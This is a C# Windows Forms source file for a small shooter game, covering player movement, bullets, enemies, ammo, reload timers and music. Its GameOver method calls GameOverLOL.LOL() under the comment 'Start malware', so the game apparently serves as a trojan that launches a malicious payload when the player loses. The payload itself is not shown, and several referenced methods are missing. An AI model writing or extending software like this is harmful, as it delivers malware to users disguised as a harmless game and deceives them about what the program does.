using System.Windows.Forms;

public class Gameform : Form{ // inheritance from "Form" which means that this game class was made entirely with Windows Form

	public Thread musiz;

	private int playerX;

	private int playerY;

	private List<int> bulletsX;

	private List<int> bulletsY;

	private List<int> enemiesX;

	private List<int> enemiesY;

	private int score;

	private int ammo;

	private string difficulty = "EASY";

	private int maxAmmo;

	private int reloadInterval;

	private Timer timer;

	private Timer reloadTimer;

	private float lolyMax = 40f;

	private float loly;

    public Gameform() {
        //         ? Control ?
        playerX = ((Control)this).Width / 2; // Player size X
        playerY = ((Control)this).Height - 70; // Player size Y
        bulletsX = new List<int>();
        bulletsY = new List<int>();
        enemiesX = new List<int>();
        enemiesY = new List<int>();
        
        // Game config
        score = 0;
        ammo = 15;
        maxAmmo = 20;
        reloadInterval = 2500;
        loly = lolyMax;

        // Setup timer
        timer = new Timer();
        timer.Interval = 50;
        timer.Tick += Timer_Tick;
        timer.Start();
        reloadTimer = new Timer();
        reloadTimer.Interval = reloadInterval;
        reloadTimer.Tick += ReloadTimer_Tick;
        reloadTimer.Start();
        StartMusic();
    }

    private void GameOver() {
        musiz.Abort();
        GameOverLOL.LOL(); // Start malware
        timer.Stop();
        reloadTimer.Stop();
    }
}